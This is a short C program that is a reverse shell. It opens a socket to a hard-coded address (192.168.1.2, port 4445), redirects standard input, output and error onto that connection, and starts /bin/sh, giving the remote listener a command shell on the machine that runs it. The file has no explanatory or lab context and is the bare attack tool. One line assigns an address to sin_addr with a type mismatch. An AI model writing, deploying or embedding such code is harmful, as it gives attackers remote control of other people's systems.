#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>


int main()
{
	struct sockaddr_in server;
	
	server.sin_family = 2;
	server.sin_port = htons(4445);    
	server.sin_addr = inet_addr("192.168.1.2");
	memset(&(server.sin_zero), '\0', 8);
	int s = socket(2,1,0);
	connect(s, (struct sockaddr *)&server, sizeof(struct sockaddr));
	dup2(s, 2);
	dup2(s, 1);
	dup2(s, 0);
	char *argv[] = { "/bin/sh", NULL };
	char *env[] = { NULL };
	execve("/bin/sh", argv , env);
	
}




